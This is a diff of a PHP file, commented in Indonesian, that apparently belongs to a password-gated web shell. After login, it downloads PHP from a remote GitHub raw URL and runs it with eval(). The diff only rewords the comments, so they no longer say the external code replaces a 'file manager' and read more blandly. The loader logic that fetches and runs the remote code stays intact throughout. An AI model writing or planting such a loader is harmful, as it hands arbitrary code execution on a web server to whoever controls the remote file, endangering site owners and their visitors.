@@ -2,15 +2,15 @@
 session_start();
 
 if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    // Setelah login, ganti file manager dengan kode eksternal
+    // Setelah login, ambil konten URL
     $url = "https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/sange-brutal.php";
     $content = fetchContent($url);
 
     if ($content !== false) {
-        // Tampilkan kode dari URL eksternal
+        // Tampilkan kontent URL
         eval("?>" . $content);
     } else {
-        echo "Gagal memuat file eksternal.";
+        echo "Gagal memuat file URL.";
     }
 } else {
     // Jika belum login, tampilkan form login
